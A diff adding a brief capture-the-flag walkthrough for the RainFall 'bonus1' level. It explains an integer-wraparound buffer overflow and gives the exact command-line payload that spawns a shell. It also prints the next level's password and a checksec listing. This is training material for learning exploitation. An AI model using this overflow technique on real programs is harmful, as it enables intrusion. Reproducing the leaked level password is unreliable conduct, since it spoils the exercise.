@@ -1,0 +1,29 @@
+Program recieve 2 arguments
+
+it uses first to compare it to 9 and 0x574f4c46, and writes second argument to string with memcpy.
+string buffer is 40, but memcpy copies atoi(arg1) * 4, so we can overwrite variable that will be compared to 0x574f4c46
+
+So to pass level we need to find number * 4 = 44
+
+44 = 101100
+101100 >> 2 = 1011 = 11
+
+We can not use positive number as it should be <= 9, so we will pass it in negative form
+
+We would not do it here, we'll simply find right number with brute force.
+
+First argument is -2147483637
+Second argument is payload of size 40 + 0x574f4c46
+
+scp -P 4242 ./Resources/findNum.c bonus1@localhost:/tmp/findNum.c 
+
+bonus1@RainFall:~$ ./bonus1 "-2147483637" $(python -c 'print "\x41" * 40 + "\x46\x4c\x4f\x57"')
+$ whoami
+bonus2
+$ cat /home/user/bonus2/.pass 
+579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+
+bonus1@RainFall:~$ su bonus2
+Password: 
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus2/bonus2
